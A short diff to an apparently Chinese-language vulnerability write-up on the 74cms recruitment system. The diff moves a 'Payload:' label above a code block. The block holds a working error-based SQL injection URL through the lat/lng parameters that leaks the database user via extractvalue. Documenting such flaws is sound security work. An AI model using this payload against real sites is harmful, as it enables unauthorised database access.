@@ -50,8 +50,9 @@
 
 这样的话只要点击完以后有数据 你在 lat  lng  字段都可以正常的进行注入
 
+Payload:
+
 ```html
-Payload: 
 http://74cms.test/index.php?m=&c=jobs&a=jobs_list&lat=23.176465&range=20&lng=113.35038 PI() / 180 - map_x  PI() / 180) / 2),2))) * 1000) AS map_range FROM qs_jobs_search j WHERE (extractvalue (1,concat(0x7e,(SELECT USER()), 0x7e))) -- a
 ```
 
